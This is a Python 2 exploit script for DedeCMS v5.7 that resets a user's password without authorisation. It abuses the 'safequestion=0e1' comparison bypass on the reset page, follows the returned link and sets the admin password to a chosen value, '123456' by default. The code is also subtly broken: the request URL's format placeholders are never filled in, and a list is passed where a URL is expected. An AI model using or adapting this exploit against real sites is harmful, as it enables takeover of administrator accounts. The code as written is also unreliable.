import requests
import re


class exploit():
    def __init__(self):
        self.param = {'url': None, 'protocol': 'http','username': 'admin', 'password': '123456', 'userpage': '/dede/member/resetpassword.php', 'timeout': 10}


    def exploit(self):
        try:
            sess = requests.Session()
            if not self.param['url']:
                print '[!] URL not specified.'
                return
            resp = sess.get('%s://%s/%s/?dopost=safequestion&safequestion=0e1&safeanwser=&id=1', timeout=int(self.param['timeout'])).text
            url = None
            url = re.findall('location=\'(.*)?\';', resp)
            if not url:
                print '[!] No location response, target seems not vulnerable.'
                return
            resp = sess.get(url, timeout=self.param['timeout'])
            sess.post(url, data={'username':self.param['username'], 'password':self.param['password']}, timeout=int(self.param['timeout']))
            print '[+] Exploit success, %s\'s password set to %s.' %(self.param['username'], self.param['password'])
            return
        except Exception, e:
            print '[!] Failed to exploit: %s' %(str(e))


    def info(self):
        print '''
        DEDECMS v5.7 arbitrary user password modification
        Parameters:
            url: Target addr
            protocol: Protocol ,default: http
            username: Username ,dafault: admin
            password: Password ,default: 123456
            timeout: Timeout , default: 10
            userpage: Password changing page ,default: /dede/member/resetpassword.php
        Referer:
            https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_V5.7_
        '''